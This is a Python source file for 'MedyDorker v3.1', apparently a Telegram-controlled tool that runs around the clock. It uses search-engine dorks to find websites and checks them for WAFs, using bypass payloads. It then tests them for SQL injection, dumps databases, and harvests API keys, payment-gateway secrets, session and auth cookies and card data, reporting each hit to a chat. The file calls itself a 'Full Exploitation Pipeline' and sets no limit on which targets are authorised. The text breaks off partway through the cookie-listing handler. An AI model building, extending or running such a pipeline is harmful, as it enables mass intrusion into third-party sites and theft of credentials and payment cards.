"""
MedyDorker v3.1 — Main Pipeline & Telegram Bot

Unified pipeline: Dorker → Scanner → Exploiter → Dumper → Reporter

Improvements v3.1:
  - SQLite persistence (replaces JSON files)
  - Concurrent URL processing (semaphore-based)
  - Smart priority queue (params+CMS+WAF scoring)
  - Per-domain circuit breaker (3 failures → 30min block)
  - Content hash deduplication
  - Soft-404 detection
  - Cookie extraction & collection (b3, session, auth)
  - Engine health tracking + adaptive rate limiting
  - Dork effectiveness scoring
  - WAF-specific bypass payloads
  - Technology-based DBMS selection

Commands:
    /start          — Show help
    /dorkon         — Start full pipeline (24/7 mode)
    /dorkoff        — Stop pipeline
    /status         — Current stats & findings
    /dorkstats      — Detailed dorking statistics
    /sqlistats      — SQL injection statistics
    /secrets        — List found secrets/keys
    /dumps          — List data dumps
    /cookies        — List extracted cookies (b3, session, auth)
    /categories     — List available dork categories
    /target <cat>   — Run targeted scan for a category
    /scan <url>     — Scan a single URL
    /deepscan <url> — Deep scan a URL (crawl + extract + SQLi)
"""

import os
import sys
import json
import re
import random
import asyncio
import hashlib
import signal
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

from loguru import logger

# Configure logging
logger.remove()
logger.add(sys.stderr, level="INFO", format="<green>{time:HH:mm:ss}</green> | <level>{level:<7}</level> | {message}")
logger.add("medydorker.log", rotation="10 MB", retention=3, level="DEBUG")

# Telegram setup
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes, filters
    HAS_PTB = True
except ImportError:
    HAS_PTB = False
    logger.warning("python-telegram-bot not installed, running without Telegram")

# Local imports
from config_v3 import DorkerConfig
from dork_generator import DorkGenerator
from engines import MultiSearch
from waf_detector import WAFDetector, ProtectionInfo
from sqli_scanner import SQLiScanner, SQLiResult
from sqli_dumper import SQLiDumper, DumpedData
from secret_extractor import SecretExtractor, ExtractedSecret
from reporter import TelegramReporter
from persistence import DorkerDB


class MedyDorkerPipeline:
    """The main v3.1 pipeline: Generate → Search → Detect → Exploit → Dump → Report."""

    def __init__(self, config: DorkerConfig = None):
        self.config = config or DorkerConfig()
        self.running = False
        self._task = None
        self._bot = None
        self._chat_id = None
        
        # Components
        self.generator = DorkGenerator(self.config.params_dir)
        self.searcher = MultiSearch(
            proxies=self._load_proxies(),
            engines=self.config.engines,
            max_pages=self.config.search_max_pages,
        )
        self.waf_detector = WAFDetector(
            timeout=self.config.waf_timeout,
            max_concurrent=self.config.waf_max_concurrent,
        )
        self.sqli_scanner = SQLiScanner(
            timeout=self.config.sqli_timeout,
            max_concurrent=self.config.sqli_max_concurrent,
            delay=self.config.sqli_delay,
        )
        self.dumper = SQLiDumper(
            scanner=self.sqli_scanner,
            output_dir=self.config.dumper_output_dir,
            max_rows=self.config.dumper_max_rows,
            timeout=self.config.dumper_timeout,
        )
        self.secret_extractor = SecretExtractor(
            timeout=self.config.secret_timeout,
            max_concurrent=self.config.secret_max_concurrent,
        )
        self.reporter = TelegramReporter(
            bot_token=self.config.telegram_bot_token,
            chat_id=self.config.telegram_group_id or self.config.telegram_chat_id,
            rate_limit=self.config.reporter_rate_limit,
            batch_size=self.config.reporter_batch_size,
        )
        
        # SQLite persistence
        self.db = DorkerDB(self.config.sqlite_db_path)
        
        # In-memory state (synced to DB)
        self.seen_domains: Set[str] = set()
        self.vulnerable_urls: List[Dict] = []
        self.found_gateways: List[Dict] = []
        self.found_secrets: List[Dict] = []
        self.found_cards: List[Dict] = []
        self.cycle_count = 0
        self.urls_scanned = 0
        self.start_time = None
        
        # Concurrency controls
        self._url_semaphore = asyncio.Semaphore(self.config.concurrent_url_limit)
        
        # Soft-404 fingerprints per domain
        self._soft404_cache: Dict[str, str] = {}
        
        # Content hash dedup (in-memory cache, backed by DB)
        self._content_hashes: Set[str] = set()
        
        # Load previous state
        self._load_state()
    
    def _load_proxies(self) -> List[str]:
        """Load proxies from file."""
        if not self.config.use_proxies:
            return []
        try:
            if os.path.exists(self.config.proxy_file):
                with open(self.config.proxy_file) as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                logger.info(f"Loaded {len(proxies)} proxies")
                return proxies
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
        return []
    
    def _load_state(self):
        """Load previous run state from SQLite (with JSON fallback migration)."""
        # Migrate from old JSON files if they exist and DB is empty
        if self.db.get_seen_domain_count() == 0:
            imported = self.db.import_from_json_files(
                seen_file=self.config.seen_domains_file,
                vuln_file=self.config.vulnerable_urls_file,
                gateway_file=self.config.gateway_keys_file,
            )
            if imported > 0:
                logger.info(f"Migrated {imported} records from JSON to SQLite")
        
        # Load from DB
        self.seen_domains = self.db.get_seen_domains()
        self.vulnerable_urls = self.db.get_vulnerable_urls(limit=1000)
        self.found_gateways = self.db.get_gateway_keys(limit=1000)
        logger.info(f"Loaded state: {len(self.seen_domains)} domains, "
                     f"{len(self.vulnerable_urls)} vulns, {len(self.found_gateways)} gateways")
    
    def _save_state(self):
        """Save current state — mostly handled by DB now, but keep JSON backcompat."""
        try:
            # Also write JSON files for backward compatibility
            with open(self.config.seen_domains_file, "w") as f:
                for domain in self.seen_domains:
                    f.write(domain + "\n")
            
            if self.vulnerable_urls:
                with open(self.config.vulnerable_urls_file, "w") as f:
                    json.dump(self.vulnerable_urls[-500:], f, indent=2)
            
            if self.found_gateways:
                with open(self.config.gateway_keys_file, "w") as f:
                    json.dump(self.found_gateways[-500:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")
    
    def _should_skip_url(self, url: str) -> bool:
        """Check if URL should be skipped."""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            
            for skip in self.config.skip_domains:
                if skip in domain:
                    return True
            
            # Circuit breaker check
            if self.db.is_domain_blocked(domain):
                logger.debug(f"Domain {domain} is circuit-broken, skipping")
                return True
            
            return False
        except:
            return True

    def _content_hash(self, content: str) -> str:
        """Generate hash for content deduplication."""
        # Strip whitespace-only differences
        cleaned = re.sub(r'\s+', ' ', content[:5000]).strip() if content else ""
        return hashlib.md5(cleaned.encode(errors="ignore")).hexdigest()

    def _is_duplicate_content(self, content: str, url: str) -> bool:
        """Check if content is a duplicate (same page served at different URL)."""
        h = self._content_hash(content)
        if h in self._content_hashes:
            return True
        if self.db.is_content_seen(content[:5000]):
            self._content_hashes.add(h)
            return True
        self._content_hashes.add(h)
        self.db.add_content_hash(content[:5000], url)
        return False

    async def _detect_soft_404(self, domain: str, session) -> Optional[str]:
        """Fetch a known-nonexistent page to fingerprint the soft-404 response."""
        if domain in self._soft404_cache:
            return self._soft404_cache[domain]
        
        try:
            fake_path = f"/{''.join(random.choices('abcdefghijklmnop', k=12))}.php"
            test_url = f"https://{domain}{fake_path}"
            
            async with session.get(test_url, allow_redirects=True, ssl=False) as resp:
                body = await resp.text(errors="ignore")
                fingerprint = self._content_hash(body)
                self._soft404_cache[domain] = fingerprint
                self.db.set_soft404_fingerprint(domain, fingerprint)
                return fingerprint
        except Exception:
            return None

    def _is_soft_404(self, content: str, domain: str) -> bool:
        """Check if the content matches the soft-404 fingerprint for this domain."""
        if not self.config.soft404_detection:
            return False
        fingerprint = self._soft404_cache.get(domain) or self.db.get_soft404_fingerprint(domain)
        if not fingerprint:
            return False
        content_hash = self._content_hash(content)
        return content_hash == fingerprint

    def _score_url_priority(self, url: str, waf_info=None) -> int:
        """Score URL for priority queue — higher = process first."""
        score = 50  # Base score
        parsed = urlparse(url)
        
        # Has parameters → higher priority
        if parsed.query:
            params = parsed.query.split("&")
            score += len(params) * 5
            
            # Has high-value params
            for p in params:
                name = p.split("=")[0].lower()
                if name in ("id", "pid", "uid", "cid", "product_id", "item_id", "cat", "category"):
                    score += 15
                elif name in ("search", "q", "query", "keyword"):
                    score += 10
        
        # WAF risk affects priority
        if waf_info:
            risk = waf_info.risk_level if hasattr(waf_info, 'risk_level') else "unknown"
            if risk == "low":
                score += 20
            elif risk == "medium":
                score += 10
            elif risk == "high":
                score -= 10
            elif risk == "extreme":
                score -= 30
            
            # Known CMS → know the DBMS → faster testing
            if hasattr(waf_info, 'cms') and waf_info.cms:
                score += 10
        
        # File extension hints
        path = parsed.path.lower()
        if path.endswith('.php'):
            score += 10
        elif path.endswith(('.asp', '.aspx')):
            score += 8
        elif path.endswith('.jsp'):
            score += 8
        
        return score

    def set_telegram_context(self, bot, chat_id):
        """Store telegram bot and chat for progress messages."""
        self._bot = bot
        self._chat_id = chat_id

    async def _send_progress(self, text: str):
        """Send a progress update to the user's chat."""
        if self._bot and self._chat_id:
            try:
                await self._bot.send_message(
                    chat_id=self._chat_id,
                    text=text,
                    parse_mode="HTML",
                )
            except Exception as e:
                logger.error(f"Progress send failed: {e}")

    async def process_url(self, url: str) -> Dict:
        """Process a single URL through the full pipeline.
        
        Steps:
        1. Soft-404 detection
        2. Content deduplication
        3. WAF Detection
        4. Cookie extraction (b3, session, auth)
        5. Secret Extraction  
        6. SQLi Testing (URL params + cookies + headers + POST)
        7. Data Dumping (if injectable)
        8. Report findings
        
        Returns:
            Dict with all findings
        """
        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "waf": None,
            "secrets": [],
            "sqli": [],
            "dumps": [],
            "cookies": {},
        }
        
        domain = urlparse(url).netloc
        self.seen_domains.add(domain)
        self.db.add_seen_domain(domain)
        self.urls_scanned += 1
        self.reporter.stats.urls_scanned += 1
        
        import aiohttp
        timeout = aiohttp.ClientTimeout(total=self.config.validation_timeout)
        
        try:
            async with self._url_semaphore:
                async with aiohttp.ClientSession(timeout=timeout, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }) as session:
                    
                    # Step 0: Soft-404 detection
                    if self.config.soft404_detection:
                        await self._detect_soft_404(domain, session)
                    
                    # Step 1: WAF Detection
                    waf_info = None
                    waf_name = None
                    if self.config.waf_detection_enabled:
                        waf_info = await self.waf_detector.detect(url, session)
                        waf_name = waf_info.waf
                        result["waf"] = {
                            "name": waf_info.waf,
                            "cdn": waf_info.cdn,
                            "bot_protection": waf_info.bot_protection,
                            "risk": waf_info.risk_level,
                            "cms": waf_info.cms,
                        }
                        
                        # Skip if too protected
                        if self.config.waf_skip_extreme and waf_info.risk_level == "extreme":
                            logger.info(f"Skipping {url} — extreme protection ({waf_info.waf or waf_info.bot_protection})")
                            return result
                        if self.config.waf_skip_high and waf_info.risk_level == "high":
                            logger.info(f"Skipping {url} — high protection ({waf_info.waf})")
                            return result
                    
                    # Step 2: Cookie Extraction
                    if self.config.cookie_extraction_enabled:
                        try:
                            jar = await self.sqli_scanner.extract_cookies(url, session)
                            if jar.cookies:
                                result["cookies"] = {
                                    "all": jar.cookies,
                                    "session": jar.session_cookies,
                                    "auth": jar.auth_cookies,
                                    "b3": jar.b3_cookies,
                                }
                                # Store in DB
                                for name, value in jar.cookies.items():
                                    cookie_type = "session" if any(name in sc for sc in jar.session_cookies) else \
                                                  "auth" if any(name in ac for ac in jar.auth_cookies) else "other"
                                    self.db.add_cookie(url, name, value, cookie_type)
                                
                                # Store b3 cookies specifically
                                for name, value in jar.b3_cookies.items():
                                    self.db.add_b3_cookie(url, name, value)
                                    
                                if jar.b3_cookies:
                                    logger.info(f"🔵 B3 cookies found at {url}: {list(jar.b3_cookies.keys())}")
                        except Exception as e:
                            logger.debug(f"Cookie extraction failed: {e}")
                    
                    # Step 3: Secret Extraction (deep — checks payment pages too)
                    if self.config.secret_extraction_enabled:
                        scan_data = await self.secret_extractor.deep_extract_site(url, session)
                        secrets = scan_data.get("secrets", []) if isinstance(scan_data, dict) else scan_data
                        if secrets:
                            result["secrets"] = [
                                {"type": s.type, "name": s.key_name, "value": s.value, "category": s.category}
                                for s in secrets
                            ]
                            
                            # Report each secret
                            for secret in secrets:
                                if secret.category == "gateway":
                                    self.found_gateways.append({
                                        "url": url,
                                        "type": secret.type,
                                        "value": secret.value,
                                        "time": datetime.now().isoformat(),
                                    })
                                    self.db.add_gateway_key(
                                        url, secret.type, secret.value,
                                        source="secret_extraction",
                                        confidence=secret.confidence,
                                    )
                                    await self.reporter.report_gateway(
                                        url, secret.type, secret.value,
                                        {"confidence": secret.confidence}
                                    )
                                else:
                                    self.found_secrets.append({
                                        "url": url,
                                        "type": secret.type,
                                        "value": secret.value,
                                        "time": datetime.now().isoformat(),
                                    })
                                    self.db.add_secret(
                                        url, secret.type, secret.key_name,
                                        secret.value, secret.category,
                                        secret.confidence,
                                    )
                                    if secret.confidence >= 0.80:
                                        await self.reporter.report_secret(
                                            url, secret.type, secret.key_name,
                                            secret.value, secret.category,
                                        )
                    
                    # Step 4: SQLi Testing (now with cookie/header/POST injection + WAF bypass)
                    if self.config.sqli_enabled:
                        sqli_results = await self.sqli_scanner.scan(
                            url, session,
                            waf_name=waf_name,
                            protection_info=waf_info,
                        )
                        if sqli_results:
                            result["sqli"] = [
                                {
                                    "param": r.parameter,
                                    "type": r.injection_type,
                                    "dbms": r.dbms,
                                    "technique": r.technique,
                                    "columns": r.column_count,
                                    "db_version": r.db_version,
                                    "current_db": r.current_db,
                                    "injection_point": r.injection_point,
                                }
                                for r in sqli_results
                            ]
                            
                            for sqli in sqli_results:
                                vuln_record = {
                                    "url": url,
                                    "param": sqli.parameter,
                                    "type": sqli.injection_type,
                                    "dbms": sqli.dbms,
                                    "technique": sqli.technique,
                                    "injection_point": sqli.injection_point,
                                    "confidence": sqli.confidence,
                                    "db_version": sqli.db_version,
                                    "current_db": sqli.current_db,
                                    "current_user": sqli.current_user,
                                    "column_count": sqli.column_count,
                                    "payload_used": sqli.payload_used,
                                    "time": datetime.now().isoformat(),
                                }
                                self.vulnerable_urls.append(vuln_record)
                                self.db.add_vulnerable_url(vuln_record)
                                
                                # Report vulnerability
                                await self.reporter.report_sqli_vuln(
                                    url, sqli.parameter, sqli.dbms,
                                    sqli.injection_type,
                                    {
                                        "db_version": sqli.db_version,
                                        "current_db": sqli.current_db,
                                        "column_count": sqli.column_count,
                                        "injection_point": sqli.injection_point,
                                    }
                                )
                                
                                # Step 5: Data Dumping (if union-based injection found)
                                if self.config.dumper_enabled and sqli.injection_type == "union":
                                    dump = await self.dumper.targeted_dump(sqli, session)
                                    if dump.has_valuable_data or dump.total_rows > 0:
                                        saved = self.dumper.save_dump(dump)
                                        result["dumps"].append({
                                            "tables": len(dump.tables),
                                            "rows": dump.total_rows,
                                            "cards": len(dump.card_data),
                                            "creds": len(dump.credentials),
                                            "keys": len(dump.gateway_keys),
                                            "files": saved,
                                        })
                                        
                                        # Report dump
                                        await self.reporter.report_data_dump(
                                            url, dump.dbms, dump.database,
                                            dump.tables,
                                            {t: len(rows) for t, rows in dump.data.items()},
                                            saved,
                                        )
                                        
                                        # Report card data specifically
                                        if dump.card_data:
                                            self.found_cards.extend(dump.card_data)
                                            for card in dump.card_data:
                                                self.db.add_card_data(url, card)
                                            await self.reporter.report_card_data(url, dump.card_data)
                                        
                                        # Report gateway keys from dump
                                        for key_entry in dump.gateway_keys:
                                            for col, val in key_entry.items():
                                                self.found_gateways.append({
                                                    "url": url,
                                                    "type": f"db_{col}",
                                                    "value": val,
                                                    "source": "sqli_dump",
                                                    "time": datetime.now().isoformat(),
                                                })
                                                self.db.add_gateway_key(
                                                    url, f"db_{col}", val,
                                                    source="sqli_dump",
                                                )
                                                await self.reporter.report_gateway(
                                                    url, f"DB: {col}", val,
                                                    {"source": "SQL injection dump"}
                                                )
                    
                    # Record scan in DB
                    findings_count = len(result.get("secrets", [])) + len(result.get("sqli", []))
                    self.db.add_scan_record(url, "auto", findings_count)
                    
                    # Reset circuit breaker on success
                    self.db.reset_domain_failure(domain)
        
        except asyncio.TimeoutError:
            logger.debug(f"Timeout processing {url}")
            self.db.record_domain_failure(domain)
        except aiohttp.ClientError as e:
            logger.debug(f"Connection error for {url}: {e}")
            self.db.record_domain_failure(domain)
        except Exception as e:
            logger.error(f"Pipeline error for {url}: {e}")
        
        return result

    async def _process_url_safe(self, url: str, results_list: list, findings_counter: list):
        """Process a URL with error handling for concurrent use."""
        try:
            result = await self.process_url(url)
            results_list.append(result)
            
            # Log findings
            findings = []
            if result.get("secrets"):
                findings.append(f"{len(result['secrets'])} secrets")
            if result.get("sqli"):
                findings.append(f"{len(result['sqli'])} SQLi vulns")
            if result.get("dumps"):
                findings.append(f"{len(result['dumps'])} dumps")
            if result.get("cookies", {}).get("b3"):
                findings.append(f"B3 cookies")
            
            if findings:
                findings_counter.append(1)
                logger.info(f"  FOUND: {', '.join(findings)} at {url[:60]}")
                await self._send_progress(
                    f"🎯 <b>HIT!</b> {', '.join(findings)}\n"
                    f"<code>{url[:80]}</code>"
                )
        except Exception as e:
            logger.debug(f"URL processing error: {url} — {e}")

    async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
        """Run one cycle of dorking + processing with concurrent URL scanning.
        
        Features:
        - Dork effectiveness scoring (productive dorks first)
        - Priority queue for URLs (high-value params first)
        - Concurrent URL processing (semaphore-bounded)
        - Content deduplication
        - Soft-404 filtering
        
        Args:
            dorks: Optional specific dorks to use (otherwise generates all)
            category: Optional category for targeted generation
        """
        self.cycle_count += 1
        logger.info(f"=== CYCLE {self.cycle_count} STARTING ===")
        
        # Generate dorks (in thread to avoid blocking event loop)
        if dorks is None:
            if category:
                dorks = await asyncio.to_thread(
                    lambda: self.generator.generate_targeted(category, max_count=500)
                )
            else:
                dorks = await asyncio.to_thread(
                    lambda: self.generator.generate_all(
                        max_total=self.config.max_dorks,
                        max_per_pattern=self.config.max_per_pattern,
                    )
                )
        
        # Use dork effectiveness scoring instead of plain shuffle
        if hasattr(self.searcher, 'dork_scorer') and self.searcher.dork_scorer:
            dorks = self.searcher.dork_scorer.sort_dorks(dorks)
            logger.info(f"Dorks sorted by effectiveness score")
        elif self.config.dork_shuffle:
            random.shuffle(dorks)
        
        logger.info(f"Processing {len(dorks)} dorks this cycle")
        await self._send_progress(
            f"🔄 <b>Cycle {self.cycle_count}</b> — Processing {len(dorks)} dorks...\n"
            f"Concurrent limit: {self.config.concurrent_url_limit}"
        )
        
        cycle_urls_found = 0
        cycle_findings = []  # Use list for thread-safe counting
        cycle_results = []
        cycle_cookies = 0
        
        for i, dork in enumerate(dorks):
            if not self.running:
                logger.info("Pipeline stopped, breaking cycle")
                break
            
            self.reporter.stats.dorks_processed += 1
            
            # Progress update every 10 dorks
            if (i + 1) % 10 == 0:
                await self._send_progress(
                    f"⏳ Dork <b>{i+1}/{len(dorks)}</b> | "
                    f"URLs found: {cycle_urls_found} | Hits: {len(cycle_findings)}"
                )
                # Warn if no results after first batch
                if (i + 1) == 10 and cycle_urls_found == 0:
                    await self._send_progress(
                        "⚠️ First 10 dorks returned 0 URLs. "
                        "Search engines may be rate-limiting or proxies may be dead."
                    )
                await asyncio.sleep(0)  # Yield to event loop
            
            try:
                # Search for URLs
                urls = await self.searcher.search(dork, self.config.results_per_dork)
                
                # Update dork scorer with results
                if hasattr(self.searcher, 'dork_scorer') and self.searcher.dork_scorer:
                    self.searcher.dork_scorer.record(dork, len(urls) if urls else 0)
                
                if not urls:
                    continue
                
                # Filter URLs
                filtered_urls = []
                for url in urls:
                    if self._should_skip_url(url):
                        continue
                    domain = urlparse(url).netloc
                    if domain in self.seen_domains:
                        continue
                    filtered_urls.append(url)
                
                if not filtered_urls:
                    continue
                
                # Sort by priority score (high-value params first)
                filtered_urls.sort(key=lambda u: self._score_url_priority(u), reverse=True)
                
                cycle_urls_found += len(filtered_urls)
                logger.info(f"[{i+1}/{len(dorks)}] Dork: {dork[:60]}... → {len(filtered_urls)} new URLs")
                
                # Notify when URLs found
                if len(filtered_urls) >= 3:
                    await self._send_progress(
                        f"🔗 Dork {i+1}: <b>{len(filtered_urls)} new URLs</b>\n"
                        f"<code>{dork[:80]}</code>"
                    )
                
                # Process URLs concurrently (bounded by semaphore)
                batch_results = []
                batch_findings = []
                
                tasks = []
                for url in filtered_urls:
                    if not self.running:
                        break
                    tasks.append(
                        self._process_url_safe(url, batch_results, batch_findings)
                    )
                
                if tasks:
                    # Run all URL tasks concurrently (semaphore inside process_url limits actual parallelism)
                    await asyncio.gather(*tasks, return_exceptions=True)
                    cycle_results.extend(batch_results)
                    cycle_findings.extend(batch_findings)
                
                # Delay between dorks
                delay = random.uniform(
                    self.config.search_delay_min,
                    self.config.search_delay_max,
                )
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Dork cycle error: {e}")
                continue
        
        # Save state after cycle
        self._save_state()
        
        # Count cookies found this cycle
        cookie_count = self.db.get_cookie_count() if hasattr(self, 'db') else 0
        b3_count = len(self.db.get_b3_cookies()) if hasattr(self, 'db') else 0
        
        summary = (
            f"✅ <b>Cycle {self.cycle_count} Complete</b>\n"
            f"Dorks: {len(dorks)} | URLs: {cycle_urls_found} | Hits: {len(cycle_findings)}\n"
            f"Total scanned: {self.urls_scanned} | Gateways: {len(self.found_gateways)} | "
            f"SQLi: {len(self.vulnerable_urls)} | Cards: {len(self.found_cards)}\n"
            f"🍪 Cookies: {cookie_count} | 🔵 B3: {b3_count}"
        )
        await self._send_progress(summary)
        logger.info(f"=== CYCLE {self.cycle_count} COMPLETE — "
                    f"{self.urls_scanned} URLs scanned, "
                    f"{len(self.found_gateways)} gateways, "
                    f"{len(self.vulnerable_urls)} SQLi vulns ===")

    async def start(self):
        """Start the full pipeline in continuous mode."""
        if self.running:
            return
        
        self.running = True
        self.start_time = datetime.now()
        
        logger.info("🚀 MedyDorker v3.0 Starting...")
        
        # Generate dorks in thread to avoid blocking event loop
        dork_count = await asyncio.to_thread(
            lambda: len(self.generator.generate_all(50000))
        )
        
        # Send startup notification
        await self.reporter.report_startup({
            "Dorks Available": dork_count,
            "Engines": ", ".join(self.config.engines),
            "SQLi": "Enabled" if self.config.sqli_enabled else "Disabled",
            "Dumper": "Enabled" if self.config.dumper_enabled else "Disabled",
            "WAF Detection": "Enabled" if self.config.waf_detection_enabled else "Disabled",
        })
        
        await self._send_progress(
            f"🚀 <b>Pipeline Started!</b>\n"
            f"Dorks: {dork_count:,} | Engines: {len(self.config.engines)}\n"
            f"Generating dorks and starting cycle..."
        )
        
        # Start status reporter
        status_task = asyncio.create_task(self._status_loop())
        
        try:
            cycle = 0
            while self.running:
                cycle += 1
                
                if self.config.max_cycles > 0 and cycle > self.config.max_cycles:
                    logger.info(f"Max cycles ({self.config.max_cycles}) reached")
                    break
                
                await self.run_dork_cycle()
                
                if self.running and self.config.continuous:
                    logger.info(f"Cycle complete, waiting {self.config.cycle_delay}s before next...")
                    await asyncio.sleep(self.config.cycle_delay)
                else:
                    break
        
        except asyncio.CancelledError:
            logger.info("Pipeline cancelled")
        except Exception as e:
            logger.error(f"Pipeline error: {e}")
            await self.reporter.report_error(str(e), "main pipeline")
        finally:
            status_task.cancel()
            self._save_state()
            if hasattr(self, 'db'):
                self.db.close()
            self.running = False
            logger.info("Pipeline stopped")

    async def stop(self):
        """Stop the pipeline."""
        self.running = False
        self._save_state()
        logger.info("Pipeline stop requested")

    async def _status_loop(self):
        """Periodically send status updates."""
        while self.running:
            try:
                await asyncio.sleep(300)  # Every 5 minutes
                if self.running:
                    stats = self.get_stats()
                    await self._send_progress(
                        f"📊 <b>Status Update</b>\n"
                        f"⏱ Uptime: {stats.get('uptime', 'N/A')}\n"
                        f"🔄 Cycles: {stats['cycles']} | URLs: {stats['urls_scanned']}\n"
                        f"🔑 Gateways: {stats['gateways_found']} | 💳 Cards: {stats['cards_found']}\n"
                        f"🔓 SQLi: {stats['sqli_vulns']} | 🔐 Secrets: {stats['secrets_found']}"
                    )
                    await self.reporter.report_status({
                        "Cycle": self.cycle_count,
                        "Seen Domains": len(self.seen_domains),
                        "Found Gateways": len(self.found_gateways),
                        "Found Cards": len(self.found_cards),
                    })
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Status loop error: {e}")

    def get_stats(self) -> Dict:
        """Get current statistics including DB stats."""
        uptime = ""
        if self.start_time:
            delta = datetime.now() - self.start_time
            hours = int(delta.total_seconds() // 3600)
            minutes = int((delta.total_seconds() % 3600) // 60)
            uptime = f"{hours}h {minutes}m"
        
        # Get DB stats
        db_stats = {}
        if hasattr(self, 'db'):
            try:
                db_stats = self.db.get_stats()
            except Exception:
                pass
        
        return {
            "running": self.running,
            "uptime": uptime,
            "cycles": self.cycle_count,
            "urls_scanned": self.urls_scanned,
            "seen_domains": len(self.seen_domains),
            "gateways_found": len(self.found_gateways),
            "secrets_found": len(self.found_secrets),
            "sqli_vulns": len(self.vulnerable_urls),
            "cards_found": len(self.found_cards),
            "cookies_total": db_stats.get("cookies", 0),
            "b3_cookies": db_stats.get("b3_cookies", 0),
            "blocked_domains": len(self.db.get_blocked_domains()) if hasattr(self, 'db') else 0,
            "content_hashes": db_stats.get("content_hashes", 0),
            **self.reporter.get_stats(),
        }


# ==================== TELEGRAM BOT HANDLERS ====================

pipeline: Optional[MedyDorkerPipeline] = None
pipeline_task: Optional[asyncio.Task] = None
scan_tasks: Dict[int, asyncio.Task] = {}  # chat_id -> running scan task


def get_pipeline() -> MedyDorkerPipeline:
    """Get or create the pipeline instance."""
    global pipeline
    if pipeline is None:
        pipeline = MedyDorkerPipeline()
    return pipeline


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    text = (
        "🔥 <b>MedyDorker v3.1</b> 🔥\n"
        "\n"
        "<b>Full Exploitation Pipeline:</b>\n"
        "Dorker → Scanner → Exploiter → Dumper → Reporter\n"
        "\n"
        "<b>Commands:</b>\n"
        "/dorkon — Start full pipeline (24/7)\n"
        "/dorkoff — Stop dorking pipeline\n"
        "/stopscan — Stop running scan\n"
        "/status — Current stats\n"
        "/dorkstats — Detailed dork stats\n"
        "/sqlistats — SQLi stats\n"
        "/secrets — Found secrets/keys\n"
        "/cookies — Show extracted cookies (b3/session)\n"
        "/dumps — Data dumps\n"
        "/categories — Dork categories\n"
        "/target &lt;cat&gt; — Targeted scan\n"
        "/scan &lt;url&gt; — Scan single URL\n"
        "/deepscan &lt;url&gt; — Deep scan URL\n"
        "\n"
        "<b>Features (v3.1):</b>\n"
        "• 50K+ dynamic dorks (XDumpGO-style)\n"
        "• 8 search engines with health tracking\n"
        "• WAF/CDN detection (60+ sigs) + bypass payloads\n"
        "• SQLi: URL + Cookie + Header + POST injection\n"
        "• 🔵 B3 distributed tracing cookie extraction\n"
        "• Concurrent URL processing (semaphore)\n"
        "• Smart param prioritization + dork scoring\n"
        "• SQLite persistence + circuit breaker\n"
        "• Soft-404 detection + content dedup\n"
        "• DIOS data extraction + card dumping\n"
        "• Real-time Telegram reporting\n"
        "• ✅ Concurrent: /scan works while dorking\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dorkon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkon command — start pipeline."""
    global pipeline_task
    p = get_pipeline()
    if p.running:
        await update.message.reply_text("⚠️ Pipeline already running! Use /status to check.")
        return
    
    # Store telegram context for progress messages
    p.set_telegram_context(context.bot, update.effective_chat.id)
    
    await update.message.reply_text(
        "🚀 Starting MedyDorker v3.0 pipeline...\n"
        "You'll get live progress updates here.\n"
        "Use /scan while dorking — it works concurrently!\n"
        "Use /dorkoff to stop dorking."
    )
    
    # Start in background and store task reference
    pipeline_task = asyncio.create_task(p.start())


async def cmd_dorkoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkoff command — stop dorking pipeline."""
    global pipeline_task
    p = get_pipeline()
    if not p.running:
        await update.message.reply_text("Pipeline is not running.")
        return
    
    await p.stop()
    
    # Cancel the task if it's still running
    if pipeline_task and not pipeline_task.done():
        pipeline_task.cancel()
        try:
            await pipeline_task
        except asyncio.CancelledError:
            pass
    pipeline_task = None
    
    await update.message.reply_text("🛑 Dorking pipeline stopped.")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command."""
    p = get_pipeline()
    stats = p.get_stats()
    
    status = "🟢 RUNNING" if stats["running"] else "🔴 STOPPED"
    
    text = (
        f"📊 <b>MedyDorker v3.0 Status</b>\n"
        f"\n"
        f"<b>State:</b> {status}\n"
        f"<b>Uptime:</b> {stats.get('uptime', 'N/A')}\n"
        f"<b>Cycles:</b> {stats['cycles']}\n"
        f"\n"
        f"<b>📈 Scanning:</b>\n"
        f"  URLs Scanned: {stats['urls_scanned']}\n"
        f"  Domains Seen: {stats['seen_domains']}\n"
        f"  Dorks Processed: {stats.get('dorks_processed', 0)}\n"
        f"\n"
        f"<b>🎯 Findings:</b>\n"
        f"  🔑 Gateways: {stats['gateways_found']}\n"
        f"  💳 Card Data: {stats['cards_found']}\n"
        f"  🔓 SQLi Vulns: {stats['sqli_vulns']}\n"
        f"  🔐 Secrets: {stats['secrets_found']}\n"
        f"\n"
        f"<b>📨 Messages:</b> {stats.get('messages_sent', 0)}\n"
        f"<b>❌ Errors:</b> {stats.get('errors', 0)}\n"
        f"\n"
        f"<b>🍪 Cookies:</b>\n"
        f"  Total: {stats.get('cookies_total', 0)}\n"
        f"  🔵 B3: {stats.get('b3_cookies', 0)}\n"
        f"  🚫 Blocked Domains: {stats.get('blocked_domains', 0)}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cookies command — show ALL extracted cookies."""
    p = get_pipeline()
    
    text = "🍪 <b>Extracted Cookies</b>\n\n"
    
    if hasattr(p, 'db'):
        # B3 cookies (top priority section)
        b3_cookies = p.db.get_b3_cookies()
        if b3_cookies:
            text += f"🔵 <b>B3 Distributed Tracing ({len(b3_cookies)}):</b>\n"
